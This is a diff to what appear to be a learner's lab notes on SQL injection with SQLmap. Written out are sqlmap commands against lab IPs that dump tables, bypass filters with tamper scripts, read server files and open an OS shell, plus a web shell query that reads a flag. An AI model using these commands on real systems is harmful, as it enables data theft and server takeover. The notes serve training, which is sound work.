@@ -1,4 +1,4 @@
-# SQL Attacking 
+# SQL Attacking (Complete)
 **SQLmap Essentials**  
 **SQL Injection Fundermentals**  
 
@@ -140,7 +140,6 @@ sqlmap -u "http://178.128.163.230:31018/case9.php?id=1&uid=29125" --randomize=ui
 sqlmap -u 'http://165.22.113.109:32331/case10.php' --data="id=1" --random-agent --batch --dump
 + What's the contents of table flag11? (Case #11)
 sqlmap -u 'http://165.22.113.109:32331/case11.php?id=1' --tamper=between --batch --dump   
-  
 + Try to use SQLMap to read the file "/var/www/html/flag.txt
 sqlmap -u "http://134.209.176.83:31022/?id=1" --file-read "/var/www/html/flag.txt"  
 + Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.  
@@ -151,7 +150,11 @@ sqlmap -u "http://134.209.176.83:31022/?id=1" --file-read "/var/www/html/flag.tx
    46  curl http://134.209.176.83:31022/shell.php?cmd=ls+-la
    47  sqlmap -u "http://134.209.176.83:31022/?id=1" --os-shell
    in browser DO http://134.209.176.83:31022/shell.php?cmd=cat+/flag.txt
-
++ What's the contents of table final_flag?  
+Playing around with the shopping items and adding to cart registered the post request. Do the old save to a text file. Add the old ‘-p id’ which we got from the POST request and our ‘common’ between tamper script we do some quick ‘-D’ database enumeration to tell us it’s in the production database and our database management system is MySql and it’s technique T (Time-Based boolean) we get the above flag.
+sqlmap -r shoe.txt -p 'id' --tamper=between -T final_flag -D production --dump dbsm=MySql --technique=T
+  
+  
 ### Useful Links
 https://medium.com/@joshthedev/step-13-sqlmap-essentials-68829d907492
 
